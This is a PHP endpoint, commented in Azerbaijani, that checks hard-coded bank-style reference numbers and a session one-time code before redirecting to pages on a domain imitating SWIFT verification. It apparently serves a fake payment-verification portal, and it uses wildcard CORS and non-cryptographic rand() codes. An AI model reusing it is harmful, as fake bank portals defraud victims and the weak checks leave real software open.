<?php
// Təhlükəsizlik başlıqları
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

session_start();

$data = json_decode(file_get_contents('php://input'), true);
$action = $data['action'] ?? '';

$refMap = [
    'COBA300525CH59279' => 'https://verify-swift.com/verification-cob.html',
    'COBA310625CH68412' => 'https://verify-swift.com/verification-cob-abnab',
    'COBA011125CH77290' => 'https://verify-swift.com/verification-code-abnaz.html',
    'COBA011125CH86478' => 'https://verify-swift.com/verification-abnzdf',
    'RCAS29016976S'      => 'https://verify-swift.com/check/verify/verifymt199/index.html',
    '2026-03-30-2020A76' => 'https://verify-swift.com/check/verify/verifymt199/mt996as7821vba921'
];

if ($action === 'check_ref') {
    $ref = $data['ref'] ?? '';
    if (array_key_exists($ref, $refMap)) {
        $_SESSION['pending_ref'] = $ref;
        // Kod yaradılır və sessiyada saxlanılır
        $otp = (string)rand(100000, 999999);
        $_SESSION['otp_code'] = $otp;
        
        // Test üçün kodu ekrana yazdırırıq (Real saytda bunu silib email funksiyasını bura bağlayacaqsınız)
        echo json_encode(['success' => true, 'debug_msg' => 'Code generated internally']); 
    } else {
        echo json_encode(['success' => false, 'message' => 'Invalid reference number.']);
    }
} 

elseif ($action === 'verify_otp') {
    $userCode = $data['code'] ?? '';
    $sentCode = $_SESSION['otp_code'] ?? '';

    if (!empty($sentCode) && $userCode === $sentCode) {
        $finalRef = $_SESSION['pending_ref'] ?? '';
        echo json_encode([
            'success' => true, 
            'redirect' => $refMap[$finalRef]
        ]);
        session_destroy(); 
    } else {
        echo json_encode(['success' => false, 'message' => 'Incorrect security code.']);
    }
}
?>
